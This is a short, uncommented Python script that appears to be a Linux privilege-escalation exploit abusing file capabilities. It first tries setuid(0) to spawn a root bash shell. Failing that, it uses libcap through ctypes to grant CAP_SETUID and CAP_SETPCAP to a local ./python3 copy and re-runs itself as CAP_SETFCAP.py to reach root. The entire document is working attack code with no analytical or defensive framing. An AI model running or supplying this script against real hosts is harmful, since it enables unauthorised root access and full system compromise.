import ctypes,os
a,b,c,d,e=["bash","libcap.so.2","CAP_SETPCAP,CAP_SETUID=+pe","./python3","CAP_SETFCAP.py"]
try:
    os.setuid(0)
    os.system(a)
except:
    f=ctypes.cdll.LoadLibrary(b)
    f.cap_from_text.argtypes=[ctypes.c_char_p]
    f.cap_from_text.restype=ctypes.c_void_p
    f.cap_set_file.argtypes=[ctypes.c_char_p,ctypes.c_void_p]
    g=c.encode()
    path=d.encode()
    h=f.cap_from_text(g)
    f.cap_set_file(path,h)
    os.system(f"{d} {e}")